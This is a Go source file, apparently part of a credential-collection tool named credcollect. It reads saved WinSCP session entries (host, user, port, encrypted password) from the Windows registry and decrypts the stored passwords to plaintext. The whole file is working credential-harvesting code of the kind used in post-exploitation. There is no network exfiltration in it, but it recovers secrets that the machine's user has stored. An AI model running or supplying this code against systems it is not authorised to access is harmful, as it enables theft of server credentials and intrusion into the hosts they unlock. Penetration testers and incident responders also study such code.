package winscp

import (
	"strconv"

	"github.com/404tk/credcollect/common"
	"golang.org/x/sys/windows/registry"
)

const (
	PW_MAGIC = 0xA3
	PW_FLAG  = 0xFF
)

func WinScp() (ret []common.WinScpPassWord) {
	key, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Martin Prikryl\\WinSCP 2\\Sessions", registry.ALL_ACCESS)
	if err != nil {
		//fmt.Println(err)
		//fmt.Println("No servers is found.")
		return
	}
	//key.Close()
	kns, err := key.ReadSubKeyNames(0)
	if err != nil {
		return
	}
	for _, b := range kns {
		key1, err := registry.OpenKey(key, b, registry.ALL_ACCESS)
		if err != nil {
			//fmt.Println("No key")
			continue
		}
		h, _, err := key1.GetStringValue("HostName")
		u, _, err := key1.GetStringValue("UserName")
		n, _, err := key1.GetIntegerValue("PortNumber")
		p, _, err := key1.GetStringValue("Password")
		portnum := strconv.Itoa(int(n))
		// default 22, PortNumber does not exist in the registry
		if portnum == "0" {
			portnum = "22"
		}
		if h != "" {
			ret = append(ret, common.WinScpPassWord{
				HostName:   h,
				PortNumber: portnum,
				UserName:   u,
				PassWord:   decrypt(h, u, p),
			})
		}

	}
	return ret

}

func decrypt(host, username, password string) string {
	key := username + host
	var passbytes []byte
	for i := 0; i < len(password); i++ {
		val, _ := strconv.ParseInt(string(password[i]), 16, 8)
		passbytes = append(passbytes, byte(val))
	}
	flag, passbytes := dec_next_char(passbytes)
	var length byte = 0
	if flag == PW_FLAG {
		_, passbytes = dec_next_char(passbytes)

		length, passbytes = dec_next_char(passbytes)
	} else {
		length = flag
	}
	toBeDeleted, passbytes := dec_next_char(passbytes)
	passbytes = passbytes[toBeDeleted*2:]

	clearpass := ""
	var (
		i   byte
		val byte
	)
	for i = 0; i < length; i++ {
		val, passbytes = dec_next_char(passbytes)
		clearpass += string(val)
	}

	if flag == PW_FLAG {
		clearpass = clearpass[len(key):]
	}
	return clearpass
}

func dec_next_char(passbytes []byte) (byte, []byte) {
	if len(passbytes) <= 0 {
		return 0, passbytes
	}
	a := passbytes[0]
	b := passbytes[1]
	passbytes = passbytes[2:]
	return ^(((a << 4) + b) ^ PW_MAGIC) & 0xff, passbytes
}
